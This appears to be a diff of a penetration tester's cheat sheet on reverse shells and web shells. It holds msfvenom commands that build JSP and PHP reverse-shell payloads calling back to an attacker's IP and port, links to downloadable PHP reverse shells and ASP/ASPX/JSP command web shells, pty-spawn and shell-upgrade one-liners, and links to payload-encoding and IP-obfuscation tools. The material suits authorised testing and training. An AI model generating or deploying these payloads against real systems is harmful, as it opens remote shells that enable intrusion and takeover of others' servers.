@@ -80,16 +80,12 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.js
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 ```
 
-### PHP - msfvenom (Non-Meterpreter)
+### PHP - msfvenom (Non-Meterpreter) - Reverse Shell
 ```
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 or  
--> Find and edit
-```
-locate php-reverse-shell
-```
-or  
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php  
 https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
 
 ## Web Shells
@@ -101,18 +97,26 @@ https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Rev
 ```
 
 ### JSP
--> Find and edit
+https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp  
+
+or in kali
 ```
 locate cmdjsp.jsp
 ```
-
 ### ASP
+https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp  
+https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp  
+
+or in kali
 ```
 locate cmd-asp-5.1.asp
 locate cmdasp.asp
 ```
 
 ### ASPX
+https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx  
+
+or in kali
 ```
 locate cmdasp.aspx
 ```
@@ -158,12 +162,12 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 locate perl-reverse-shell.pl
 ```
 
-### Spawn tty via Python
+## Spawn tty via Python
 ```
 python -c 'import pty;pty.spawn("/bin/bash")';
 ```
 
-### Spawn an upgraded shell
+## Spawn an upgraded shell
 ```
 export TERM=xterm && /usr/bin/script -qc /bin/bash /dev/null 
 ```
@@ -173,11 +177,20 @@ stty raw -echo; fg
 ```
 
 ### tools to make life easier
--> revshell generator
+-> revshell generator  
 https://www.revshells.com/
 
--> CyberChef 
+-> CyberChef  
 https://gchq.github.io/CyberChef/
 
--> urlencoder
+-> urlencoder  
 https://www.urlencoder.org/
+
+-> octal
+http://www.unit-conversion.info/texttools/octal/
+
+-> hex
+http://www.unit-conversion.info/texttools/octal/
+
+-> IP converter
+https://www.silisoftware.com/tools/ipconverter.php
